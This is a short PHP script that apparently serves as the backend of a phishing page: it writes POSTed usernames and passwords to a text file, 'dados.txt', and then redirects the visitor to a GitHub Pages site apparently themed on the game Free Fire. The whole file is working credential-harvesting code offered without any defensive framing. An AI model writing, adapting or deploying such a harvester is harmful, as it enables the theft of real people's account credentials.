<?php

file_put_contents("dados.txt", "Connected: " . $_POST['from'] . "  Username: " . $_POST['id'] . " Pass: " . $_POST['pass']      .  "\n", FILE_APPEND);
header('Location:https://lord3k.github.io/Sitefreefire/');
exit();
